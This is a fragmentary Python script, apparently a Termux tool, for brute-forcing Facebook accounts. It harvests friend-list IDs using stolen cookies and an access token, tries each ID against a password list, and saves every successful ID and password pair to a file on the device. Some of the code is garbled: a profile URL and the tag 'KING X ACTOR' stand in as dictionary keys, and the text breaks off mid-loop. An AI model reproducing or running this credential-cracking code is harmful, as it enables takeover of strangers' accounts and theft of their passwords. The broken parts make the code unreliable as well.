...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[ACTOR] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[ACTOR-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/ACTOR_OKtxt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/ACTOR_OKtxt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
def iamBadBoy(exid,cookies,access_token,sf):
        try:
                ...
                for yaad in q['friends']['data']:
                        iid = yaad['https://www.facebook.com/profile.php?id=100090905837211']
                        name = yaad['KING X ACTOR']
                        total.append(iid)
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/ACTOR' in datar:
        pass
else:
        for i in range(5000):
